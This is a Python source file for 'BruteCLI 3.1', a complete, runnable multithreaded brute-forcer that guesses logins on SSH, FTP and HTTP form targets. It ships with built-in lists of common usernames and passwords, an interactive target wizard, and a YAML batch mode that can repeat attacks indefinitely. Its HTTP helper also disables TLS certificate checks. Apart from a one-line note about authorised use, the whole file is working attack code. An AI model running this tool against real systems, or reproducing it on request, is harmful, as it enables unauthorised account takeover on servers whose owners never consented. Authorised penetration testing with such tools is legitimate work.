#!/usr/bin/env python3
"""
BruteCLI 3.1 – terminal brute-forcer for SSH / FTP / HTTP
• Built-in username & password lists
• Interactive wizard when no CLI args
• Optional YAML batch/automation
Use only on systems you are authorised to test.
"""

# ───── graceful colour fallback ─────
try:
    from termcolor import colored
except ModuleNotFoundError:            # run fine without colours
    def colored(text, *_, **__):
        return text
# ─────────────────────────────────────

import argparse, sys, time, threading, queue, signal, os

# yaml is optional (only for batch mode)
try:
    import yaml
except ModuleNotFoundError:
    yaml = None

# ───── built-in word-lists (≈50 each) ─────
COMMON_USERS = [
    "admin","administrator","root","user","test","guest","info","mysql","postgres",
    "oracle","ftp","git","ubuntu","pi","www","apache","nginx","backup","dev","qa",
    "support","marketing","sales","hr","office","demo","sysadmin","service",
    "security","operator","web","mail","email","public","jdoe","jsmith","jack",
    "john","michael","david","peter","paul","alex","alice","bob","charlie","eve",
    "mallory","trudy","victor"
]

COMMON_PASSWORDS = [
    "password","123456","123456789","12345","qwerty","password1","12345678",
    "admin","1234567","1234","letmein","welcome","iloveyou","123123","dragon",
    "football","monkey","baseball","abc123","111111","login","master","sunshine",
    "ashley","bailey","qwerty123","charlie","donald","football1","zaq1zaq1",
    "superman","hello","passw0rd","freedom","whatever","qazwsx","trustno1",
    "password123","123qwe","killer","hottie","lovely","jordan","jordan23",
    "harley","admin123","password!","secret"
]
# ───────────────────────────────────────────

# ───── protocol helpers (imports inside) ───
def ssh_try(host, user, pwd, port=22, timeout=5):
    import paramiko, socket
    try:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cli.connect(host, port, username=user, password=pwd,
                    banner_timeout=timeout, auth_timeout=timeout, timeout=timeout)
        cli.close(); return True
    except (paramiko.ssh_exception.AuthenticationException,
            paramiko.ssh_exception.SSHException,
            socket.error):
        return False

def ftp_try(host, user, pwd, port=21, timeout=5):
    from ftplib import FTP, error_perm, all_errors
    try:
        ftp = FTP(); ftp.connect(host, port, timeout=timeout)
        ftp.login(user, pwd); ftp.quit(); return True
    except (error_perm, all_errors):
        return False

def http_try(url, user_field, pass_field, success_kw, user, pwd, timeout=5):
    import requests, urllib3
    urllib3.disable_warnings()
    data = {user_field: user, pass_field: pwd}
    try:
        r = requests.post(url, data=data, timeout=timeout,
                          allow_redirects=True, verify=False)
        if success_kw.lower() in r.text.lower() or r.status_code in (301, 302):
            return True
    except requests.RequestException:
        pass
    return False
# ───────────────────────────────────────────

class BruteCLI:
    def __init__(self, job: dict):
        self.job   = job
        self.q     = queue.Queue()
        self.found = False
        self.lock  = threading.Lock()

    # build combo queue --------------------------------------------------------
    def prepare(self):
        users = self._read(self.job.get("userlist"), COMMON_USERS)
        if self.job.get("username"):
            users = [self.job["username"]]
        pwds  = self._read(self.job.get("passlist"), COMMON_PASSWORDS)
        for u in users:
            for p in pwds:
                self.q.put((u, p))

    @staticmethod
    def _read(path, builtin):
        if not path:
            return builtin
        try:
            with open(path, errors="ignore") as f:
                return [ln.strip() for ln in f if ln.strip()]
        except (OSError, IOError):
            print(colored(f"[!] Can't read {path} – using built-in list", "yellow"))
            return builtin

    # one worker thread --------------------------------------------------------
    def worker(self):
        while not self.q.empty() and not self.found:
            u, p = self.q.get()
            if self._try(u, p):
                with self.lock:
                    self.found = True
                    print(colored(f"[+] {u}:{p}", "green", attrs=["bold"]))
            self.q.task_done()

    def _try(self, u, p):
        proto = self.job["protocol"]
        if proto == "ssh":
            return ssh_try(self.job["target"], u, p, port=self.job["port"],
                           timeout=self.job["timeout"])
        if proto == "ftp":
            return ftp_try(self.job["target"], u, p, port=self.job["port"],
                           timeout=self.job["timeout"])
        if proto == "http":
            return http_try(self.job["url"], self.job["user_field"],
                            self.job["pass_field"], self.job["success"],
                            u, p, timeout=self.job["timeout"])
        return False

    # run the attack -----------------------------------------------------------
    def run(self):
        self.prepare()
        total = self.q.qsize() or 1
        nth   = min(self.job["threads"], total)
        print(colored(f"[•] {total} combos → "
                      f"{self.job['protocol'].upper()} {self.job['target']} "
                      f"({nth} threads)", "cyan"))
        t0 = time.time()
        threads = [threading.Thread(target=self.worker, daemon=True)
                   for _ in range(nth)]
        for t in threads: t.start()
        for t in threads: t.join()
        if not self.found:
            print(colored("[-] No valid credentials found.", "red"))
        print(colored(f"[✓] Finished in {time.time()-t0:.1f}s\n", "yellow"))

# ───── interactive wizard ─────
def wizard():
    banner = colored(r"""
 ____                 _          ____ _     ___ 
| __ )  ___  __ _  __| | ___ _ _| __ ) |   |_ _|
|  _ \ / _ \/ _` |/ _` |/ _ \ '__|  _ \ |    | | 
| |_) |  __/ (_| | (_| |  __/ |  | |_) | |___| | 
|____/ \___|\__,_|\__,_|\___|_|  |____/|_____|___|
""", "magenta")
    print(banner)

    def ask(msg, default=None):
        prm = f"{msg} [{default}]: " if default else f"{msg}: "
        ans = input(prm).strip()
        return ans or default

    job = {
        "protocol" : ask("Protocol (ssh / ftp / http)", "ssh").lower(),
        "target"   : ask("Target host/IP"),
        "threads"  : int(ask("Threads", "4")),
        "timeout"  : int(ask("Timeout seconds", "5")),
        "port"     : None,
        "username" : ask("Single username (blank = userlist)", ""),
        "userlist" : ask("Custom userlist file (blank = built-in)", ""),
        "passlist" : ask("Custom passlist file (blank = built-in)", ""),
    }

    if job["protocol"] == "http":
        job.update({
            "url"        : ask("Login URL (https://…/login)"),
            "user_field" : ask("Form field – username", "username"),
            "pass_field" : ask("Form field – password", "password"),
            "success"    : ask("Success keyword/redirect", "dashboard"),
            "port"       : 443 if job["url"].startswith("https://") else 80
        })
    elif job["protocol"] == "ssh":
        job["port"] = int(ask("SSH port", "22"))
    elif job["protocol"] == "ftp":
        job["port"] = int(ask("FTP port", "21"))

    # empty strings → None
    for k in ("userlist", "passlist", "username"):
        if job[k] == "":
            job[k] = None
    return job

# ───── batch/automation helper ─────
def run_batch(path, loop=False, delay=300):
    if not yaml:
        print(colored("[!] PyYAML not installed – batch mode unavailable","red"))
        return
    try:
        with open(path, "r") as f:
            tasks = yaml.safe_load(f) or []
    except Exception as e:
        print(colored(f"[!] Can't read {path}: {e}", "red")); return
    if not isinstance(tasks, list) or not tasks:
        print(colored(f"[!] {path} is empty or not a YAML list", "red")); return

    round_no = 0
    while True:
        round_no += 1
        print(colored(f"\n=== Batch round #{round_no} ===", "blue"))
        for t in tasks:
            try:
                BruteCLI(t).run()
            except KeyError as miss:
                print(colored(f"[!] Malformed task: missing {miss}", "red"))
        if not loop:
            break
        print(colored(f"[•] Sleeping {delay}s before next round…", "cyan"))
        time.sleep(delay)

# ───── CLI args (only for batch flags) ─────
def parse_cli():
    p = argparse.ArgumentParser(
        description="BruteCLI – wizard if run with no flags; batch with -B"
    )
    p.add_argument("-B","--batch", metavar="tasks.yaml",
                   help="Run jobs from YAML file")
    p.add_argument("--loop", action="store_true",
                   help="With -B, repeat forever")
    p.add_argument("--delay", type=int, default=300,
                   help="Seconds between loops (default 300)")
    return p.parse_args()

# ───── graceful CTRL-C ─────
def sigint(_s,_f):
    print(colored("\n[!] Interrupted – exiting", "yellow")); sys.exit(0)

# ───── entry-point ─────
if __name__ == "__main__":
    signal.signal(signal.SIGINT, sigint)
    args = parse_cli()

    if args.batch:                         # batch / automation
        run_batch(args.batch, args.loop, args.delay)
    elif len(sys.argv) == 1:               # wizard
        BruteCLI(wizard()).run()
    else:
        print("Launch with no arguments for the interactive wizard, "
              "or use -B tasks.yaml for batch mode.")
